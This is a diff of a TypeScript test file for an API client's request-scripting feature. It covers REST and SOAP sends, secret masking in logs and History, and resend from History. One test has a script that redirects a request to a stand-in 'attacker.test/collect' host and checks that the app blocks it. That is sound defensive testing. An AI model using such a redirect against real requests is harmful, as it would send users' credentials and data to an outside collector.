@@ -21,20 +21,27 @@ import {
   createSequence,
   createSequenceStep,
   entry,
-  resolveApiBaseUrl,
 } from '@wirebench/engine';
-import type { PropertyMap, Project, RequestScripts, RestRequestDef } from '@wirebench/engine';
+import type { Project, RequestScripts, RestRequestDef } from '@wirebench/engine';
 import { EngineService } from '../src/main/engine-service.js';
 import { HistoryService } from '../src/main/history-service.js';
-import { sendRestRequest, type RequestChannelDeps } from '../src/main/ipc/request.js';
-import { resolveRestSend } from '../src/main/rest-send.js';
+import { registerHistoryChannels } from '../src/main/ipc/history.js';
+import type { RequestChannelDeps } from '../src/main/ipc/request.js';
 import { ScriptHost } from '../src/main/script-host.js';
-import { sendAndRecordHistory } from '../src/main/send-with-history.js';
 import { SequenceRunner } from '../src/main/sequence-runner.js';
-import type { WebContents } from 'electron';
-import type { HistoryEntryWire } from '../src/shared/wire-types.js';
+import { sendThroughEngine } from '../src/main/send/exchange.js';
+import { sendDepsFor } from './helpers/send-deps.js';
+import type { HistoryEntryWire, RestExchangeSummary } from '../src/shared/wire-types.js';
 
-vi.mock('electron', () => ({ ipcMain: { handle: () => undefined } }));
+const handlers = new Map<string, (event: unknown, payload: unknown) => Promise<unknown>>();
+
+vi.mock('electron', () => ({
+  ipcMain: {
+    handle: (name: string, handler: (event: unknown, payload: unknown) => Promise<unknown>) => {
+      handlers.set(name, handler);
+    },
+  },
+}));
 
 const TOKEN = 'bearer-7c1e9d';
 const API_KEY = 'header-key-51ab';
@@ -86,6 +93,8 @@ interface Harness {
   readonly deps: RequestChannelDeps;
   readonly engine: EngineService;
   readonly history: HistoryEntryWire[];
+  /** A single REST send of `requestId`, through the engine, with the same project and History. */
+  readonly sendRest: (sendId: string, requestId: string) => Promise<RestExchangeSummary>;
 }
 
 async function harness(model: Project): Promise<Harness> {
@@ -99,29 +108,32 @@ async function harness(model: Project): Promise<Harness> {
   const history = new HistoryService(userDataDir);
   await history.open('p1');
   const appended: HistoryEntryWire[] = [];
+  // The project's own `region` property, which every send here expands against.
+  const located = { ...model, properties: { ...model.properties, region: 'eu' } };
   const deps: RequestChannelDeps = {
     project: {
       projectId: () => 'p1',
-      scopesFor: () => ({ project: { region: 'eu' }, global: {}, system: {} }),
-      restSend: (requestId: string, _draft: unknown, _envId: unknown, sequence?: PropertyMap) =>
-        resolveRestSend({
-          project: model,
-          requestId,
-          scopes: {
-            project: { region: 'eu' },
-            global: {},
-            system: {},
-            ...(sequence !== undefined ? { sequence } : {}),
-          },
-          resolveBaseUrl: (api) => resolveApiBaseUrl(model, undefined, api),
-        }),
+      runContextFor: () => ({ project: located, projectDir: '/tmp/none' }),
+      restMeta: () => undefined,
     } as unknown as RequestChannelDeps['project'],
     history,
     onHistoryAppended: (wire) => appended.push(wire),
-    secretsFor: () => (ref) => Promise.resolve(ref === 'secret:api_key' ? API_KEY : undefined),
+    // The send's project's secrets: its token, and the credentials its auth names.
+    secretsFor: () => (ref) =>
+      Promise.resolve(ref === 'secret:api_key' ? API_KEY : ref === 'sec_token' ? TOKEN : undefined),
     scripts: host,
   };
-  return { deps, engine, history: appended };
+  const restDeps = sendDepsFor(located, {
+    history,
+    onHistoryAppended: (wire) => appended.push(wire),
+    // The send's project's secrets: its token, and the credentials its auth names.
+    secretsFor: () => (ref) =>
+      Promise.resolve(ref === 'secret:api_key' ? API_KEY : ref === 'sec_token' ? TOKEN : undefined),
+    scripts: host,
+  });
+  const sendRest = (sendId: string, requestId: string): Promise<RestExchangeSummary> =>
+    sendThroughEngine(restDeps, sendId, requestId, { draft: { kind: 'rest' } });
+  return { deps, engine, history: appended, sendRest };
 }
 
 const echoed = (text: string): { headers: Record<string, string>; query: Record<string, string> } =>
@@ -140,9 +152,9 @@ describe('a REST send with scripts', () => {
         post: "test('echoed', () => expect(response.status).toBe(200));",
       }),
     };
-    const { deps, engine } = await harness(project([request]));
+    const { sendRest } = await harness(project([request]));
 
-    const summary = await sendRestRequest(engine, deps, { sendId: 's1', requestId: 'r1' });
+    const summary = await sendRest('s1', 'r1');
 
     const seen = echoed(summary.text);
     expect(seen.headers['x-region']).toBe('eu');
@@ -173,9 +185,9 @@ describe('a REST send with scripts', () => {
         url: '/echo',
         headers: [entry('x-session', '${#Sequence#token}'), entry('x-plain', '${#Sequence#plain}')],
       });
-      const { deps, engine, history } = await harness(project([login, next]));
+      const { sendRest, history } = await harness(project([login, next]));
 
-      const first = await sendRestRequest(engine, deps, { sendId: 's1', requestId: 'r1' });
+      const first = await sendRest('s1', 'r1');
       expect(first.script?.log.join('\n')).not.toContain(LOGIN_TOKEN);
       expect(JSON.stringify(history[0])).not.toContain(LOGIN_TOKEN);
       expect(host.sessionValues('p1')).toEqual({ token: LOGIN_TOKEN, plain: 'visible' });
@@ -184,7 +196,7 @@ describe('a REST send with scripts', () => {
         { name: 'plain', value: 'visible', secret: false },
       ]);
 
-      const second = await sendRestRequest(engine, deps, { sendId: 's2', requestId: 'r2' });
+      const second = await sendRest('s2', 'r2');
       // The server got the token; the request as the summary and History show it has it masked.
       expect(echoed(second.text).headers['x-session']).toBe(LOGIN_TOKEN);
       expect(echoed(second.text).headers['x-plain']).toBe('visible');
@@ -205,9 +217,9 @@ describe('a REST send with scripts', () => {
         ...createRestRequest('Echo', { id: 'r1', url: '/echo' }),
         scripts: scripts({ pre: "request.url = 'http://attacker.test/collect';" }),
       };
-      const { deps, engine, history } = await harness(project([request]));
+      const { sendRest, history } = await harness(project([request]));
 
-      await expect(sendRestRequest(engine, deps, { sendId: 's1', requestId: 'r1' })).rejects.toMatchObject({
+      await expect(sendRest('s1', 'r1')).rejects.toMatchObject({
         code: 'script-origin-change',
       });
       expect(history).toEqual([]);
@@ -219,9 +231,9 @@ describe('a REST send with scripts', () => {
       ...createRestRequest('Echo', { id: 'r1', url: '/echo' }),
       scripts: scripts({ post: 'log(response.statuss);' }),
     };
-    const { deps, engine } = await harness(project([request]));
+    const { sendRest } = await harness(project([request]));
 
-    const error = await sendRestRequest(engine, deps, { sendId: 's1', requestId: 'r1' }).then(
+    const error = await sendRest('s1', 'r1').then(
       () => undefined,
       (thrown: unknown) => thrown as { code: string; message: string },
     );
@@ -234,9 +246,9 @@ describe('a REST send with scripts', () => {
       ...createRestRequest('Echo', { id: 'r1', url: '/echo' }),
       scripts: scripts({ pre: "request.headers.set('x-ran', 'yes');", enabled: false }),
     };
-    const { deps, engine } = await harness(project([request]));
+    const { sendRest } = await harness(project([request]));
 
-    const summary = await sendRestRequest(engine, deps, { sendId: 's1', requestId: 'r1' });
+    const summary = await sendRest('s1', 'r1');
     expect(echoed(summary.text).headers['x-ran']).toBeUndefined();
     expect(summary.scriptsOff).toBe(true);
     expect(summary.script).toBeUndefined();
@@ -274,7 +286,14 @@ describe('a SOAP send with scripts', () => {
               order: 0,
               requests: [
                 {
-                  ...createRequest('Add', { id: 'soap-1', envelopeXml: '<e/>', soapVersion: '1.1' }),
+                  ...createRequest('Add', {
+                    id: 'soap-1',
+                    envelopeXml: '<e/>',
+                    soapVersion: '1.1',
+                    properties: { timeoutMs: 5_000 },
+                  }),
+                  endpointUrl: endpoint,
+                  auth: { type: 'basic', username: 'svc', passwordRef: 'sec_pw', preemptive: true },
                   scripts: scripts({
                     pre: [
                       "request.headers.set('x-trace', 'from-script');",
@@ -289,33 +308,25 @@ describe('a SOAP send with scripts', () => {
             },
           ],
         });
-        const model: Project = { ...createProject('Demo', { id: 'p1' }), interfaces: [iface] };
-        const { deps, engine } = await harness(model);
-        const engineWithPassword = new EngineService((ref) => Promise.resolve(ref === 'sec_pw' ? 'pw-9d2' : undefined));
+        const model: Project = { ...createProject('Demo', { id: 'p1' }), properties: { v: '1' }, interfaces: [iface] };
+        await harness(model);
+        const deps = sendDepsFor(model, {
+          // The project's token, and the password its Basic auth names.
+          secretsFor: () => (ref) =>
+            Promise.resolve(ref === 'secret:api_key' ? API_KEY : ref === 'sec_pw' ? 'pw-9d2' : undefined),
+          scripts: host,
+        });
 
-        const summary = await sendAndRecordHistory(
-          engineWithPassword,
-          {
-            ...deps,
-            project: {
-              scopesFor: () => ({ project: { v: '1' }, global: {}, system: {} }),
-              authFor: () => ({ type: 'basic', username: 'svc', passwordRef: 'sec_pw', preemptive: true }),
-              requestMeta: () => undefined,
-              projectId: () => 'p1',
-            },
-          },
-          {
-            sendId: 'soap-send',
-            requestId: 'soap-1',
-            input: {
+        // The editor's envelope, unsaved, rides over the saved `<e/>`.
+        const summary = await sendThroughEngine(deps, 'soap-send', 'soap-1', {
+          draft: {
+            kind: 'soap',
+            override: {
               endpoint,
               envelopeXml: '<Envelope><Body><v>${v}</v><k>${secret:api_key}</k></Body></Envelope>',
-              soapVersion: '1.1',
-              timeoutMs: 5_000,
             },
           },
-        );
-        void engine;
+        });
 
         expect(seen).toHaveLength(1);
         expect(seen[0]?.headers['x-trace']).toBe('from-script');
@@ -365,7 +376,6 @@ describe('a sequence step with scripts', () => {
     const result = await new SequenceRunner().run(
       { sequenceId: 'S1', runId: 'R1' },
       { service: engine, requests: deps, modelOf: () => model, emit: () => undefined },
-      {} as WebContents,
     );
 
     expect(result.steps.map((step) => step.error)).toEqual([undefined, undefined]);
@@ -374,5 +384,93 @@ describe('a sequence step with scripts', () => {
     expect(result.steps[0]?.scriptLog).toHaveLength(1);
     expect(JSON.stringify(result)).not.toContain(LOGIN_TOKEN);
     expect(host.sessionValues('p1')).toEqual({});
+  });
+});
+
+describe('a SOAP resend from History', () => {
+  /** A SOAP server that answers every POST; `soap-1` is sent to it with the given scripts. */
+  async function resendOf(requestScripts: RequestScripts): Promise<{ reply: unknown; seen: string[] }> {
+    const seen: string[] = [];
+    const soap = createServer((req, res) => {
+      seen.push(String(req.headers['x-trace'] ?? ''));
+      req.resume();
+      req.on('end', () => {
+        res.writeHead(200, { 'content-type': 'text/xml' });
+        res.end('<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><ok/></s:Body></s:Envelope>');
+      });
+    });
+    await new Promise<void>((resolve) => soap.listen(0, '127.0.0.1', resolve));
+    try {
+      const iface = createInterface('Calc', {
+        id: 'iface-1',
+        definitionUrl: 'http://example.test/calc.wsdl',
+        operations: [
+          {
+            name: 'Add',
+            bindingName: '{urn:calc}CalcSoap',
+            slug: 'Add',
+            order: 0,
+            requests: [
+              {
+                ...createRequest('Add', { id: 'soap-1', envelopeXml: '<e/>', soapVersion: '1.1' }),
+                endpointUrl: `http://127.0.0.1:${String((soap.address() as AddressInfo).port)}/soap`,
+                scripts: requestScripts,
+              },
+            ],
+          },
+        ],
+      });
+      const model: Project = { ...createProject('Demo', { id: 'p1' }), interfaces: [iface] };
+      await harness(model);
+      const entry = {
+        id: 'h-1',
+        at: '2026-01-01T00:00:00.000Z',
+        projectId: 'p1',
+        requestId: 'soap-1',
+        requestName: 'Add',
+        interfaceName: 'Calc',
+        operationName: 'Add',
+        endpoint: 'http://old.test/soap',
+        soapVersion: '1.1',
+        durationMs: 1,
+        ok: true,
+        request: { envelopeXml: '<e/>', headers: [] },
+        sizeBytes: 1,
+      } satisfies HistoryEntryWire;
+      handlers.clear();
+      registerHistoryChannels(
+        { get: (id: string) => (id === 'h-1' ? entry : undefined) } as unknown as HistoryService,
+        {
+          project: {
+            projectId: () => 'p1',
+            endpointFor: () => 'http://h/s',
+          },
+          send: sendDepsFor(model, { scripts: host }),
+        },
+      );
+      const reply = await handlers.get('history.resend')!({ sender: {} }, { id: 'h-1' });
+      return { reply, seen };
+    } finally {
+      await new Promise((resolve) => soap.close(resolve));
+    }
+  }
+
+  it("runs the saved request's scripts, as its send from the editor does", { timeout: 60_000 }, async () => {
+    const { reply, seen } = await resendOf(
+      scripts({
+        pre: "request.headers.set('x-trace', 'from-script');",
+        post: "test('answered', () => expect(response.status).toBe(200));",
+      }),
+    );
+    expect(reply).toMatchObject({ ok: true, value: { script: { tests: [{ name: 'answered', passed: true }] } } });
+    expect(seen).toEqual(['from-script']);
+  });
+
+  it('says its scripts are off when they are, running none', { timeout: 60_000 }, async () => {
+    const { reply, seen } = await resendOf(
+      scripts({ pre: "request.headers.set('x-trace', 'from-script');", enabled: false }),
+    );
+    expect(reply).toMatchObject({ ok: true, value: { scriptsOff: true } });
+    expect(seen).toEqual(['']);
   });
 });
